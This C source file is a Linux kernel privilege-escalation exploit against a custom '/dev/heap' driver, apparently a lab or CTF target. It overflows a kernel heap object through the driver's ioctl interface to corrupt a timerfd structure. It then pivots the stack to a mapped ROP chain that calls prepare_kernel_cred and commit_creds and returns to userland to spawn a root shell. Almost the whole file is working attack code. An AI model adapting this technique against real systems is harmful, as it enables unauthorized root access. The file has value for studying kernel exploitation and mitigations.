#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <sys/timerfd.h>
#include <time.h>
#include <sys/mman.h>

#include "../heap.h"

#define MAX_ADDRESSES 1024

int fd;
unsigned long allocated_addresses[MAX_ADDRESSES] = {0};
unsigned int current_max = 0;

unsigned long user_cs, user_ss, user_sp, user_rflags;

unsigned long stacklift = 0xffffffff81457dc9; // mov esp, 0x5b000000 ; pop rbp ; ret
unsigned long newstack = 0x5b000000;
unsigned long pop_rdi_ret = 0xffffffff81001568; // pop rdi; ret;
unsigned long prepare_kernel_cred = 0xffffffff8108c240;
unsigned long pop_rdx_ret = 0xffffffff8101c946; // pop rdx; ret;
unsigned long cmp_rdx_8_jne_ret = 0xffffffff81aa2871; // cmp rdx, 8; jne; ret;
unsigned long mov_rdi_rax_jne_xor_ret = 0xffffffff813e52e4; // mov rdi, rax; jne; xor eax, eax; ret;
unsigned long commit_creds = 0xffffffff8108be00;
unsigned long swapgs_nop3_xor_ret = 0xffffffff81c01036; // swapgs; nop x 3; xor; ret;
unsigned long iretq = 0xffffffff810261db; // iretq


void save_state(){
    __asm__(
        ".intel_syntax noprefix;" // setting intel syntax
        "mov user_cs, cs;" // saving address of code segment
        "mov user_ss, ss;" // saving address of stack segment
        "mov user_sp, rsp;" // saving stack pointer
        "pushf;" // push flag register onto stack
        "pop user_rflags;" // saving flag register
        ".att_syntax;"        
    );
}  

void spawn_shell(){
    printf("[+] Returned to userland, spawning root shell...\n");
    if(getuid() == 0){
        printf("[+] Privilege level successfully escalated, spawning shell...\n");
	char *arg[2] = {"/bin/sh", NULL};
        execve("/bin/sh", arg, NULL);
	exit(0);
    }else{
        printf("[-] Failed to escalate privileges, exiting...\n");
        exit(-1);
    }
}

unsigned long user_rip = (unsigned long)spawn_shell;

void create_rop_mem(){
    printf("[+] Creating ROP chain on memory...\n");
    unsigned long *mem = mmap((void*)newstack-0x1000, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
    mem[0] = 0x31337;
    unsigned int off = 0x1000 / 8;
    mem[off++] = 0x1337;
    mem[off++] = pop_rdi_ret; // pop rdi; ret;
    mem[off++] = 0; // to rdi
    mem[off++] = prepare_kernel_cred;
    mem[off++] = pop_rdx_ret; // pop rdx; ret;
    mem[off++] = 8; // to rdx
    mem[off++] = cmp_rdx_8_jne_ret; // cmp rdx, 8; jne; ret;
    mem[off++] = mov_rdi_rax_jne_xor_ret; // mov rdi, rax; jne; xor eax, eax; ret;
    mem[off++] = commit_creds;
    mem[off++] = swapgs_nop3_xor_ret; // swapgs; nop; nop; nop; xor rbx, rbx ret;
    mem[off++] = iretq;
    mem[off++] = user_rip;
    mem[off++] = user_cs;
    mem[off++] = user_rflags;
    mem[off++] = user_sp;
    mem[off++] = user_ss;
}


void driver_free(unsigned long address){
	int ret;

	ret = ioctl(fd, IOCTL_KMALLOC, address);
	if(ret < -1){
		printf("[-] Failed to allocate kernel memory");
		exit(-1);
	}
}

void driver_alloc(struct iomalloc *iom){
	int ret;

	ret = ioctl(fd, IOCTL_KMALLOC, iom);
	if(ret < -1){
		printf("[-] Failed to allocate kernel memory");
		exit(-1);
	}
}

void driver_read_write(void* to, void* from, size_t size){
	int ret;

	struct iorw *rw = (struct iorw*)malloc(sizeof(struct iorw));
	if(rw == NULL){
		printf("[-] Failed to allocate iorw struct\n");
		exit(-1);
	}

	rw->size = size;
	rw->from = from;
	rw->to = to;

	ret = ioctl(fd, IOCTL_RW_HEAP, rw);
	if(ret < -1){
		printf("[-] Failed to read/write from/to kernel heap\n");
		perror("Kernel read");
		exit(-1);
	}

	free(rw);
}

void create_timer_instance(){
	int tfd;
	struct itimerspec i;

	i.it_interval.tv_sec = 0;
	i.it_interval.tv_nsec = 0;
	i.it_value.tv_sec = 5;
	i.it_value.tv_nsec = 0;

	tfd = timerfd_create(CLOCK_MONOTONIC, 0);
	timerfd_settime(tfd, 0, &i, 0);
}

int main(){
	int ret;
	struct iomalloc *iom;
	unsigned long target[64] = {0};
	unsigned long payload[38] = {0};
	unsigned int off = 32;

	save_state();
	create_rop_mem();

	for(int i=0; i < 32; i++){
		payload[i] = 0x4141414141414141;
	}

	printf("[+] Opening device file...\n");

	fd = open("/dev/heap", O_RDWR);
	if(fd < 0){
		printf("[-] Failed to open device file\n");
		perror("Opening file");
		exit(-1);
	}

	iom = (struct iomalloc*)malloc(sizeof(struct iomalloc));
	if(iom == NULL){
		printf("[-] Failed to allocate payload struct\n");
		close(fd);
		exit(-1);
	}

	iom->size = 256;
	iom->addr = NULL;

	printf("[+] Allocating address...\n");
	driver_alloc(iom);
	printf("[+] Creating timerfd struct...\n");
	create_timer_instance();
	printf("[+] Overloading timerfd...\n");
	driver_read_write(target, iom->addr, 512);
	for(int i = 0; i < 5; i++){
		payload[off] = target[off];
		off++;
	}
	payload[off] = stacklift;

	printf("off=%d\n", off);
	printf("%p\n", (void*)stacklift);

	printf("[+] Sending payload to the driver...\n");
	driver_read_write(iom->addr, payload, 304);
	printf("[+] Triggering timerfd callback...\n");
	sleep(5);

	driver_free((unsigned long)iom->addr);

	close(fd);
	free(iom);
}
